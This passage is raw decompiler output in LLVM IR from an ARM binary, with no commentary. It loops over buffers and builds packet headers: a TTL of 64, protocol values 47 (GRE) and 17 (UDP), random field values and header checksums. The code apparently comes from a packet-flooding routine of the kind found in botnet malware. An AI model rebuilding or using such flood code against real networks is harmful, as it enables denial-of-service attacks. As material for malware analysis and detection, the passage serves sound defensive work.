  store i32 %v4_b3d8, i32* %r2.global-to-local, align 4
  %v3_b690 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b690, i32* %r3.global-to-local, align 4
  %v2_b694 = load i32, i32* %r4.global-to-local, align 4
  %v5_b694 = mul i32 %v2_b694, 4
  %v6_b694 = add i32 %v5_b694, %v4_b3d8
  %v7_b694 = inttoptr i32 %v6_b694 to i32*
  store i32 %v4_b688, i32* %v7_b694, align 4
  %v0_b698 = load i32, i32* %r2.global-to-local, align 4
  %v1_b698 = load i32, i32* %r3.global-to-local, align 4
  %v4_b698 = mul i32 %v1_b698, 4
  %v5_b698 = add i32 %v4_b698, %v0_b698
  %v6_b698 = inttoptr i32 %v5_b698 to i32*
  %v7_b698 = load i32, i32* %v6_b698, align 4
  store i32 %v7_b698, i32* %r4.global-to-local, align 4
  %v1_b69c = inttoptr i32 %v7_b698 to i8*
  %v2_b69c = load i8, i8* %v1_b69c, align 1
  %tmp = urem i8 %v2_b69c, 16
  %v1_b6a0 = zext i8 %tmp to i32
  %v1_b6a4 = or i32 %v1_b6a0, 64
  store i32 %v1_b6a4, i32* %r2.global-to-local, align 4
  %v1_b6a8 = trunc i32 %v1_b6a4 to i8
  store i8 %v1_b6a8, i8* %v1_b69c, align 1
  %v0_b6ac = load i32, i32* %r4.global-to-local, align 4
  %v1_b6ac = inttoptr i32 %v0_b6ac to i8*
  %v2_b6ac = load i8, i8* %v1_b6ac, align 1
  %v1_b6b0 = and i8 %v2_b6ac, -16
  %v1_b6b4 = or i8 %v1_b6b0, 5
  store i32 %v1_b458, i32* %r1.global-to-local, align 4
  store i8 %v1_b6b4, i8* %v1_b6ac, align 1
  %v2_b6c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b6c4 = add i32 %v2_b6c4, 1
  %v4_b6c4 = inttoptr i32 %v3_b6c4 to i8*
  store i8 %v5_b410, i8* %v4_b6c4, align 1
  %v2_b6cc = load i32, i32* %r4.global-to-local, align 4
  %v3_b6cc = add i32 %v2_b6cc, 8
  %v4_b6cc = inttoptr i32 %v3_b6cc to i8*
  store i8 %v5_b448, i8* %v4_b6cc, align 1
  store i32 %v4_b61c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_b6d8 = load i32, i32* %r1.global-to-local, align 4
  %v9_b6d8 = icmp eq i32 %v0_b6d8, 0
  store i1 %v9_b6d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b638, i32* %r2.global-to-local, align 4
  %v2_b6e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b6e0 = add i32 %v2_b6e0, 4
  %v4_b6e0 = inttoptr i32 %v3_b6e0 to i8*
  store i8 %v1_b6e0, i8* %v4_b6e0, align 1
  store i32 %v4_b5e4, i32* %r1.global-to-local, align 4
  %v0_b6e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6e8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_b67c
  %v1_b6e8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_b6e8, i32* %r3.global-to-local, align 4
  %v2_b6ec = trunc i32 %v1_b6e8 to i8
  %v3_b6ec = load i32, i32* %r4.global-to-local, align 4
  %v4_b6ec = add i32 %v3_b6ec, 7
  %v5_b6ec = inttoptr i32 %v4_b6ec to i8*
  store i8 %v2_b6ec, i8* %v5_b6ec, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b67c, %bb
  store i32 47, i32* %r3.global-to-local, align 4
  %v0_b6f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b6f4 = trunc i32 %v0_b6f4 to i8
  %v2_b6f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b6f4 = add i32 %v2_b6f4, 3
  %v4_b6f4 = inttoptr i32 %v3_b6f4 to i8*
  store i8 %v1_b6f4, i8* %v4_b6f4, align 1
  %v0_b6f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b6f8 = trunc i32 %v0_b6f8 to i8
  %v2_b6f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_b6f8 = add i32 %v2_b6f8, 2
  %v4_b6f8 = inttoptr i32 %v3_b6f8 to i8*
  store i8 %v1_b6f8, i8* %v4_b6f8, align 1
  %v0_b6fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6fc, label %bb89, label %bb88

bb88:                                             ; preds = %.thread
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb89

bb89:                                             ; preds = %.thread, %bb88
  store i32 %v3_b63c, i32* %r1.global-to-local, align 4
  %v0_b704 = load i32, i32* %r3.global-to-local, align 4
  %v1_b704 = trunc i32 %v0_b704 to i8
  %v2_b704 = load i32, i32* %r4.global-to-local, align 4
  %v3_b704 = add i32 %v2_b704, 9
  %v4_b704 = inttoptr i32 %v3_b704 to i8*
  store i8 %v1_b704, i8* %v4_b704, align 1
  %v0_b708 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b708, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v1_b708 = load i32, i32* %r2.global-to-local, align 4
  %v2_b708 = trunc i32 %v1_b708 to i8
  %v3_b708 = load i32, i32* %r4.global-to-local, align 4
  %v4_b708 = add i32 %v3_b708, 6
  %v5_b708 = inttoptr i32 %v4_b708 to i8*
  store i8 %v2_b708, i8* %v5_b708, align 1
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v3_b70c = load i32, i32* %stack_var_-40, align 4
  %v5_b714 = mul i32 %v3_b70c, 24
  store i32 %v5_b714, i32* %r3.global-to-local, align 4
  store i32 %v5_b4f8, i32* %r2.global-to-local, align 4
  %v1_b71c = load i32, i32* %r4.global-to-local, align 4
  %v2_b71c = add i32 %v1_b71c, 12
  %v3_b71c = inttoptr i32 %v2_b71c to i32*
  store i32 %v5_b4f8, i32* %v3_b71c, align 4
  %v0_b720 = load i32, i32* %r3.global-to-local, align 4
  %v1_b720 = load i32, i32* @sb, align 4
  %v2_b720 = add i32 %v1_b720, %v0_b720
  store i32 %v2_b720, i32* %r3.global-to-local, align 4
  %v1_b724 = add i32 %v2_b720, 16
  %v2_b724 = inttoptr i32 %v1_b724 to i32*
  %v3_b724 = load i32, i32* %v2_b724, align 4
  store i32 %v3_b724, i32* %r2.global-to-local, align 4
  %v0_b728 = load i32, i32* %r1.global-to-local, align 4
  %v1_b728 = trunc i32 %v0_b728 to i8
  %v2_b728 = load i32, i32* %r4.global-to-local, align 4
  %v3_b728 = add i32 %v2_b728, 5
  %v4_b728 = inttoptr i32 %v3_b728 to i8*
  store i8 %v1_b728, i8* %v4_b728, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v0_b730 = load i32, i32* %r4.global-to-local, align 4
  %v1_b730 = add i32 %v0_b730, 20
  store i32 %v1_b730, i32* %r1.global-to-local, align 4
  %v3_b734 = add i32 %v0_b730, 22
  %v4_b734 = inttoptr i32 %v3_b734 to i8*
  store i8 101, i8* %v4_b734, align 1
  %v0_b738 = load i32, i32* %r2.global-to-local, align 4
  %v1_b738 = load i32, i32* %r4.global-to-local, align 4
  %v2_b738 = add i32 %v1_b738, 16
  %v3_b738 = inttoptr i32 %v2_b738 to i32*
  store i32 %v0_b738, i32* %v3_b738, align 4
  %v0_b73c = load i32, i32* %r4.global-to-local, align 4
  %v1_b73c = add i32 %v0_b73c, 24
  store i32 %v1_b73c, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v0_b744 = load i32, i32* %r3.global-to-local, align 4
  %v1_b744 = add i32 %v0_b744, -93
  store i32 %v1_b744, i32* %r3.global-to-local, align 4
  %v2_b748 = load i32, i32* %r1.global-to-local, align 4
  %v3_b748 = add i32 %v2_b748, 3
  %v4_b748 = inttoptr i32 %v3_b748 to i8*
  store i8 88, i8* %v4_b748, align 1
  %v0_b74c = load i32, i32* %r3.global-to-local, align 4
  %v1_b74c = trunc i32 %v0_b74c to i8
  %v2_b74c = load i32, i32* %r0.global-to-local, align 4
  %v3_b74c = add i32 %v2_b74c, 12
  %v4_b74c = inttoptr i32 %v3_b74c to i8*
  store i8 %v1_b74c, i8* %v4_b74c, align 1
  %v0_b750 = load i32, i32* %ip.global-to-local, align 4
  %v1_b750 = trunc i32 %v0_b750 to i8
  %v2_b750 = load i32, i32* %r0.global-to-local, align 4
  %v3_b750 = add i32 %v2_b750, 13
  %v4_b750 = inttoptr i32 %v3_b750 to i8*
  store i8 %v1_b750, i8* %v4_b750, align 1
  %v0_b754 = load i32, i32* %r4.global-to-local, align 4
  %v1_b754 = add i32 %v0_b754, 38
  %v2_b754 = inttoptr i32 %v1_b754 to i8*
  %v3_b754 = load i8, i8* %v2_b754, align 1
  %tmp104 = urem i8 %v3_b754, 16
  %v1_b758 = zext i8 %tmp104 to i32
  %v1_b75c = or i32 %v1_b758, 64
  store i32 %v1_b75c, i32* %r3.global-to-local, align 4
  %v1_b760 = trunc i32 %v1_b75c to i8
  store i8 %v1_b760, i8* %v2_b754, align 1
  %v0_b764 = load i32, i32* %r4.global-to-local, align 4
  %v1_b764 = add i32 %v0_b764, 38
  %v2_b764 = inttoptr i32 %v1_b764 to i8*
  %v3_b764 = load i8, i8* %v2_b764, align 1
  %v1_b768 = and i8 %v3_b764, -16
  %v1_b76c = or i8 %v1_b768, 5
  store i8 %v1_b76c, i8* %v2_b764, align 1
  %v0_b778 = load i32, i32* %r4.global-to-local, align 4
  %v1_b778 = add i32 %v0_b778, 38
  store i32 %v1_b778, i32* %r5.global-to-local, align 4
  %v3_b77c = add i32 %v0_b778, 39
  %v4_b77c = inttoptr i32 %v3_b77c to i8*
  store i8 %v5_b410, i8* %v4_b77c, align 1
  store i32 %v4_b62c, i32* %r1.global-to-local, align 4
  store i32 %tmp87, i32* %r3.global-to-local, align 4
  store i32 %v3_b64c, i32* %r2.global-to-local, align 4
  %v2_b78c = load i32, i32* %r5.global-to-local, align 4
  %v3_b78c = add i32 %v2_b78c, 4
  %v4_b78c = inttoptr i32 %v3_b78c to i8*
  store i8 %v5_b65c, i8* %v4_b78c, align 1
  %v0_b790 = load i32, i32* %r1.global-to-local, align 4
  %v1_b790 = trunc i32 %v0_b790 to i8
  %v2_b790 = load i32, i32* %r5.global-to-local, align 4
  %v3_b790 = add i32 %v2_b790, 2
  %v4_b790 = inttoptr i32 %v3_b790 to i8*
  store i8 %v1_b790, i8* %v4_b790, align 1
  %v0_b794 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b794, label %bb93, label %bb92

bb92:                                             ; preds = %bb91
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb93

bb93:                                             ; preds = %bb91, %bb92
  store i32 %v4_b798, i32* %r1.global-to-local, align 4
  %v0_b79c = load i32, i32* %r2.global-to-local, align 4
  %v1_b79c = trunc i32 %v0_b79c to i8
  %v2_b79c = load i32, i32* %r5.global-to-local, align 4
  %v3_b79c = add i32 %v2_b79c, 3
  %v4_b79c = inttoptr i32 %v3_b79c to i8*
  store i8 %v1_b79c, i8* %v4_b79c, align 1
  store i32 %v4_b6c8, i32* %r2.global-to-local, align 4
  %v0_b7a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b7a4, label %bb95, label %bb94

bb94:                                             ; preds = %bb93
  %v1_b7a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_b7a4 = trunc i32 %v1_b7a4 to i8
  %v3_b7a4 = load i32, i32* %r5.global-to-local, align 4
  %v4_b7a4 = add i32 %v3_b7a4, 6
  %v5_b7a4 = inttoptr i32 %v4_b7a4 to i8*
  store i8 %v2_b7a4, i8* %v5_b7a4, align 1
  br label %bb95

bb95:                                             ; preds = %bb93, %bb94
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_b7ac = load i32, i32* %r1.global-to-local, align 4
  %v1_b7ac = trunc i32 %v0_b7ac to i8
  %v2_b7ac = load i32, i32* %r5.global-to-local, align 4
  %v3_b7ac = add i32 %v2_b7ac, 5
  %v4_b7ac = inttoptr i32 %v3_b7ac to i8*
  store i8 %v1_b7ac, i8* %v4_b7ac, align 1
  %v0_b7b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b7b0 = trunc i32 %v0_b7b0 to i8
  %v2_b7b0 = load i32, i32* %r5.global-to-local, align 4
  %v3_b7b0 = add i32 %v2_b7b0, 8
  %v4_b7b0 = inttoptr i32 %v3_b7b0 to i8*
  store i8 %v1_b7b0, i8* %v4_b7b0, align 1
  %v0_b7b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b7b4, label %bb97, label %bb96

bb96:                                             ; preds = %bb95
  %v1_b7b4 = load i32, i32* %ip.global-to-local, align 4
  %v2_b7b4 = trunc i32 %v1_b7b4 to i8
  %v3_b7b4 = load i32, i32* %r5.global-to-local, align 4
  %v4_b7b4 = add i32 %v3_b7b4, 7
  %v5_b7b4 = inttoptr i32 %v4_b7b4 to i8*
  store i8 %v2_b7b4, i8* %v5_b7b4, align 1
  br label %bb97

bb97:                                             ; preds = %bb95, %bb96
  %v0_b7b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7b8 = trunc i32 %v0_b7b8 to i8
  %v2_b7b8 = load i32, i32* %r5.global-to-local, align 4
  %v3_b7b8 = add i32 %v2_b7b8, 9
  %v4_b7b8 = inttoptr i32 %v3_b7b8 to i8*
  store i8 %v1_b7b8, i8* %v4_b7b8, align 1
  %v0_b7bc = call i32 @function_105b0()
  store i32 %v0_b7bc, i32* %r0.global-to-local, align 4
  store i32 %v1_b570, i32* %r1.global-to-local, align 4
  store i1 %v2_b7c8, i1* %cpsr_z.global-to-local, align 1
  %v1_b7cc = sub i32 1023, %v0_b7bc
  store i32 %v1_b7cc, i32* %r3.global-to-local, align 4
  br i1 %v2_b7c8, label %.thread19, label %.thread20

.thread19:                                        ; preds = %bb97
  %v2_b7d4 = load i32, i32* %r5.global-to-local, align 4
  %v3_b7d4 = add i32 %v2_b7d4, 16
  %v4_b7d4 = inttoptr i32 %v3_b7d4 to i32*
  store i32 %v1_b7cc, i32* %v4_b7d4, align 4
  br label %bb98

.thread20:                                        ; preds = %bb97
  %v1_b7d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b7d0 = add i32 %v1_b7d0, 16
  %v3_b7d0 = inttoptr i32 %v2_b7d0 to i32*
  %v4_b7d0 = load i32, i32* %v3_b7d0, align 4
  store i32 %v4_b7d0, i32* %r3.global-to-local, align 4
  %v2_b7d8 = load i32, i32* %r5.global-to-local, align 4
  %v3_b7d8 = add i32 %v2_b7d8, 16
  %v4_b7d8 = inttoptr i32 %v3_b7d8 to i32*
  store i32 %v4_b7d0, i32* %v4_b7d8, align 4
  br label %bb98

bb98:                                             ; preds = %.thread19, %.thread20
  store i32 %v4_b7dc, i32* %r3.global-to-local, align 4
  %v0_b7e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_b7e0 = add i32 %v0_b7e0, 58
  store i32 %v1_b7e0, i32* %r6.global-to-local, align 4
  %v1_b7e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b7e4 = add i32 %v1_b7e4, 12
  %v3_b7e4 = inttoptr i32 %v2_b7e4 to i32*
  store i32 %v0_b7bc, i32* %v3_b7e4, align 4
  %v0_b7e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7e8 = trunc i32 %v0_b7e8 to i8
  %v2_b7e8 = load i32, i32* %r6.global-to-local, align 4
  %v3_b7e8 = add i32 %v2_b7e8, 1
  %v4_b7e8 = inttoptr i32 %v3_b7e8 to i8*
  store i8 %v1_b7e8, i8* %v4_b7e8, align 1
  %v3_b7ec = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b7ec, i32* %r3.global-to-local, align 4
  store i32 %v1_b3ac, i32* %r1.global-to-local, align 4
  %v1_b7f4 = add i32 %v3_b7ec, 1
  store i32 %v1_b7f4, i32* %r4.global-to-local, align 4
  store i32 %v4_b7f8, i32* %r2.global-to-local, align 4
  %v9_b7fc = icmp eq i32 %v1_b7f4, %v1_b3ac
  store i1 %v9_b7fc, i1* %cpsr_z.global-to-local, align 1
  %v0_b800 = load i32, i32* %sl.global-to-local, align 4
  %v1_b800 = trunc i32 %v0_b800 to i8
  %v2_b800 = load i32, i32* %r6.global-to-local, align 4
  %v3_b800 = add i32 %v2_b800, 5
  %v4_b800 = inttoptr i32 %v3_b800 to i8*
  store i8 %v1_b800, i8* %v4_b800, align 1
  %v0_b804 = load i32, i32* %r2.global-to-local, align 4
  %v1_b804 = trunc i32 %v0_b804 to i8
  %v2_b804 = load i32, i32* %r6.global-to-local, align 4
  %v3_b804 = inttoptr i32 %v2_b804 to i8*
  store i8 %v1_b804, i8* %v3_b804, align 1
  %v0_b808 = load i32, i32* %r7.global-to-local, align 4
  %v1_b808 = trunc i32 %v0_b808 to i8
  %v2_b808 = load i32, i32* %r6.global-to-local, align 4
  %v3_b808 = add i32 %v2_b808, 2
  %v4_b808 = inttoptr i32 %v3_b808 to i8*
  store i8 %v1_b808, i8* %v4_b808, align 1
  %v0_b80c = load i32, i32* %fp.global-to-local, align 4
  %v1_b80c = trunc i32 %v0_b80c to i8
  %v2_b80c = load i32, i32* %r6.global-to-local, align 4
  %v3_b80c = add i32 %v2_b80c, 3
  %v4_b80c = inttoptr i32 %v3_b80c to i8*
  store i8 %v1_b80c, i8* %v4_b80c, align 1
  %v0_b810 = load i32, i32* %r8.global-to-local, align 4
  %v1_b810 = trunc i32 %v0_b810 to i8
  %v2_b810 = load i32, i32* %r6.global-to-local, align 4
  %v3_b810 = add i32 %v2_b810, 4
  %v4_b810 = inttoptr i32 %v3_b810 to i8*
  store i8 %v1_b810, i8* %v4_b810, align 1
  %v0_b814 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_b814, i32* %stack_var_-40, align 4
  %v5_b818 = icmp slt i32 %v1_b7f4, %v1_b3ac
  br i1 %v5_b818, label %dec_label_pc_b67c, label %dec_label_pc_b81c.preheader

dec_label_pc_b81c.preheader:                      ; preds = %bb98, %dec_label_pc_b554
  %v1_b83c = add i32 %v5_b4a4, 66
  %v1_b840 = add i32 %v5_b4a4, 8
  %v2_b854 = icmp eq i32 %v5_b4f8, -1
  %v7_b854 = icmp eq i32 %v5_b4f8, -1
  %v9_ba78 = icmp eq i32 %v3_b574, add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1)
  %v2_bae8 = icmp eq i32 %v1_b570, 0
  %v2_b8b0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_b8c8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_b8d8 = ptrtoint i32* %stack_var_-52 to i32
  %v2_b8e4 = ptrtoint i32* %stack_var_-50 to i32
  %v2_b8f8 = icmp eq i32 %v1_b4c4, 0
  br label %dec_label_pc_b81c

dec_label_pc_b81c:                                ; preds = %dec_label_pc_b81c.preheader, %dec_label_pc_bb24
  store i32 %v1_b3ac, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_b56c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_b56c, label %dec_label_pc_bb24, label %dec_label_pc_b830

dec_label_pc_b830:                                ; preds = %dec_label_pc_b81c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v5_b4a4, i32* %r1.global-to-local, align 4
  store i32 %v1_b83c, i32* @fp, align 4
  store i32 %v1_b840, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_b9d4

dec_label_pc_b850:                                ; preds = %dec_label_pc_b9d4
  store i32 %v5_b4f8, i32* %r2.global-to-local, align 4
  store i1 %v7_b854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b854, label %dec_label_pc_ba68, label %dec_label_pc_b85c

dec_label_pc_b85c:                                ; preds = %dec_label_pc_ba00, %dec_label_pc_b850
  store i32 %v3_b574, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_ba78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ba78, label %dec_label_pc_ba84, label %dec_label_pc_b870

dec_label_pc_b870:                                ; preds = %dec_label_pc_ba68.dec_label_pc_b870_crit_edge, %dec_label_pc_b85c
  %v1_b874 = phi i32 [ %v1_b874.pre, %dec_label_pc_ba68.dec_label_pc_b870_crit_edge ], [ add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), %dec_label_pc_b85c ]
  store i32 %v3_b578, i32* %r1.global-to-local, align 4
  %v9_b874 = icmp eq i32 %v3_b578, %v1_b874
  store i1 %v9_b874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b874, label %dec_label_pc_babc, label %dec_label_pc_b87c

dec_label_pc_b87c:                                ; preds = %dec_label_pc_ba84.dec_label_pc_b87c_crit_edge, %dec_label_pc_b870
  %v1_b880 = phi i32 [ %v1_b880.pre, %dec_label_pc_ba84.dec_label_pc_b87c_crit_edge ], [ %v1_b874, %dec_label_pc_b870 ]
  store i32 %v3_b57c, i32* %r2.global-to-local, align 4
  %v9_b880 = icmp eq i32 %v3_b57c, %v1_b880
  store i1 %v9_b880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b880, label %dec_label_pc_bad8, label %dec_label_pc_b888

dec_label_pc_b888:                                ; preds = %dec_label_pc_babc, %dec_label_pc_b87c
  store i32 %v1_b570, i32* %r3.global-to-local, align 4
  store i1 %v2_bae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bae8, label %dec_label_pc_bafc, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_b888
  %v1_b890 = load i32, i32* @r5, align 4
  %v2_b890 = add i32 %v1_b890, 16
  %v3_b890 = inttoptr i32 %v2_b890 to i32*
  %v4_b890 = load i32, i32* %v3_b890, align 4
  store i32 %v4_b890, i32* %r3.global-to-local, align 4
  %v2_b894 = load i32, i32* @r6, align 4
  %v3_b894 = add i32 %v2_b894, 16
  %v4_b894 = inttoptr i32 %v3_b894 to i32*
  store i32 %v4_b890, i32* %v4_b894, align 4
  br label %dec_label_pc_b89c

dec_label_pc_b89c:                                ; preds = %bb103, %.thread21, %dec_label_pc_bafc
  %v0_b89c = call i32 @function_105b0()
  store i32 %v0_b89c, i32* %r0.global-to-local, align 4
  store i32 %v0_b89c, i32* %stack_var_-44, align 4
  %v0_b8a4 = call i32 @function_105b0()
  store i32 %v0_b8a4, i32* %r0.global-to-local, align 4
  store i32 %v0_b8a4, i32* %stack_var_-48, align 4
  %v0_b8ac = call i32 @function_105b0()
  store i32 %v2_b8b0, i32* %r1.global-to-local, align 4
  store i32 %v0_b8ac, i32* %stack_var_-52, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_b8bc = load i32, i32* @r8, align 4
  store i32 %v0_b8bc, i32* %r0.global-to-local, align 4
  %v3_b8c0 = call i32 @function_12db0(i32 %v0_b8bc, i32 %v2_b8b0, i32 4)
  %v0_b8c4 = load i32, i32* @r8, align 4
  %v1_b8c4 = add i32 %v0_b8c4, 6
  store i32 %v1_b8c4, i32* %r0.global-to-local, align 4
  store i32 %v2_b8c8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_b8d0 = call i32 @function_12db0(i32 %v1_b8c4, i32 %v2_b8c8, i32 4)
  %v0_b8d4 = load i32, i32* @r8, align 4
  %v1_b8d4 = add i32 %v0_b8d4, 4
  store i32 %v1_b8d4, i32* %r0.global-to-local, align 4
  store i32 %v2_b8d8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_b8e0 = call i32 @function_12db0(i32 %v1_b8d4, i32 %v2_b8d8, i32 2)
  store i32 %v2_b8e4, i32* %r1.global-to-local, align 4
  %v0_b8e8 = load i32, i32* @r8, align 4
  %v1_b8e8 = add i32 %v0_b8e8, 10
  store i32 %v1_b8e8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_b8f0 = call i32 @function_12db0(i32 %v1_b8e8, i32 %v2_b8e4, i32 2)
  store i32 %v3_b8f0, i32* %r0.global-to-local, align 4
  store i32 %v1_b4c4, i32* %r1.global-to-local, align 4
  store i1 %v2_b8f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b8f8, label %dec_label_pc_b900, label %dec_label_pc_bb08

dec_label_pc_b900:                                ; preds = %dec_label_pc_b89c, %dec_label_pc_bb08
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b904 = load i32, i32* @sl, align 4
  %v1_b904 = trunc i32 %v0_b904 to i8
  %v2_b904 = load i32, i32* @r5, align 4
  %v3_b904 = add i32 %v2_b904, 10
  %v4_b904 = inttoptr i32 %v3_b904 to i8*
  store i8 %v1_b904, i8* %v4_b904, align 1
  %v0_b908 = load i32, i32* @sl, align 4
  %v1_b908 = trunc i32 %v0_b908 to i8
  %v2_b908 = load i32, i32* @r5, align 4
  %v3_b908 = add i32 %v2_b908, 11
  %v4_b908 = inttoptr i32 %v3_b908 to i8*
  store i8 %v1_b908, i8* %v4_b908, align 1
  %v0_b90c = load i32, i32* @r5, align 4
  store i32 %v0_b90c, i32* @r0, align 4
  %v2_b910 = call i32 @function_f188(i32 %v0_b90c, i32 20)
  %v3_b910 = trunc i32 %v2_b910 to i8
  %v4_b914 = sdiv i32 %v2_b910, 256
  store i32 %v4_b914, i32* %r3.global-to-local, align 4
  %v1_b918 = trunc i32 %v4_b914 to i8
  %v2_b918 = load i32, i32* @r5, align 4
  %v3_b918 = add i32 %v2_b918, 11
  %v4_b918 = inttoptr i32 %v3_b918 to i8*
  store i8 %v1_b918, i8* %v4_b918, align 1
  %v3_b91c = load i32, i32* @r5, align 4
  %v4_b91c = add i32 %v3_b91c, 10
  %v5_b91c = inttoptr i32 %v4_b91c to i8*
  store i8 %v3_b910, i8* %v5_b91c, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b924 = load i32, i32* @sl, align 4
  %v1_b924 = trunc i32 %v0_b924 to i8
  %v2_b924 = load i32, i32* @r6, align 4
  %v3_b924 = add i32 %v2_b924, 10
  %v4_b924 = inttoptr i32 %v3_b924 to i8*
  store i8 %v1_b924, i8* %v4_b924, align 1
  %v0_b928 = load i32, i32* @sl, align 4
  %v1_b928 = trunc i32 %v0_b928 to i8
  %v2_b928 = load i32, i32* @r6, align 4
  %v3_b928 = add i32 %v2_b928, 11
  %v4_b928 = inttoptr i32 %v3_b928 to i8*
  store i8 %v1_b928, i8* %v4_b928, align 1
  %v0_b92c = load i32, i32* @r6, align 4
  store i32 %v0_b92c, i32* @r0, align 4
  %v2_b930 = call i32 @function_f188(i32 %v0_b92c, i32 20)
  %v3_b930 = trunc i32 %v2_b930 to i8
  store i32 %v2_b930, i32* %r0.global-to-local, align 4
  %v4_b934 = sdiv i32 %v2_b930, 256
  store i32 %v4_b934, i32* %r3.global-to-local, align 4
  %v3_b938 = load i32, i32* @r6, align 4
  %v4_b938 = add i32 %v3_b938, 10
  %v5_b938 = inttoptr i32 %v4_b938 to i8*
  store i8 %v3_b930, i8* %v5_b938, align 1
  %v0_b93c = load i32, i32* %r3.global-to-local, align 4
  %v1_b93c = trunc i32 %v0_b93c to i8
  %v2_b93c = load i32, i32* @r6, align 4
  %v3_b93c = add i32 %v2_b93c, 11
  %v4_b93c = inttoptr i32 %v3_b93c to i8*
  store i8 %v1_b93c, i8* %v4_b93c, align 1
  %v0_b940 = load i32, i32* @r7, align 4
  %v1_b940 = add i32 %v0_b940, 4
  %v2_b940 = inttoptr i32 %v1_b940 to i8*
  %v3_b940 = load i8, i8* %v2_b940, align 1
  %v4_b940 = zext i8 %v3_b940 to i32
  store i32 %v4_b940, i32* %r3.global-to-local, align 4
  %v1_b944 = add i32 %v0_b940, 5
  %v2_b944 = inttoptr i32 %v1_b944 to i8*
  %v3_b944 = load i8, i8* %v2_b944, align 1
  %v4_b944 = zext i8 %v3_b944 to i32
  store i32 %v0_b940, i32* @r1, align 4
  %v4_b94c = mul nuw nsw i32 %v4_b944, 256
  %v5_b94c = or i32 %v4_b94c, %v4_b940
  store i32 %v5_b94c, i32* %r2.global-to-local, align 4
  %v0_b950 = load i32, i32* @sl, align 4
  %v1_b950 = trunc i32 %v0_b950 to i8
  %v3_b950 = add i32 %v0_b940, 6
  %v4_b950 = inttoptr i32 %v3_b950 to i8*
  store i8 %v1_b950, i8* %v4_b950, align 1
  store i32 %v1_b840, i32* %r3.global-to-local, align 4
  %v0_b958 = load i32, i32* @sl, align 4
  %v1_b958 = trunc i32 %v0_b958 to i8
  %v2_b958 = load i32, i32* @r7, align 4
  %v3_b958 = add i32 %v2_b958, 7
  %v4_b958 = inttoptr i32 %v3_b958 to i8*
  store i8 %v1_b958, i8* %v4_b958, align 1
  %v0_b95c = load i32, i32* @r6, align 4
  store i32 %v0_b95c, i32* %r0.global-to-local, align 4
  %v4_b960 = call i32 @function_f1e4(i32 %v0_b95c, i32 %v0_b940, i32 %v5_b94c, i32 %v1_b840)
  %v5_b960 = trunc i32 %v4_b960 to i8
  store i32 %v4_b960, i32* %r0.global-to-local, align 4
  %v3_b964 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b964, i32* %r3.global-to-local, align 4
  %v3_b968 = mul i32 %v3_b964, 32
  store i32 %v3_b968, i32* %r2.global-to-local, align 4
  %v0_b96c = load i32, i32* @r5, align 4
  %v1_b96c = add i32 %v0_b96c, 16
  %v2_b96c = inttoptr i32 %v1_b96c to i32*
  %v3_b96c = load i32, i32* %v2_b96c, align 4
  store i32 %v3_b96c, i32* %r1.global-to-local, align 4
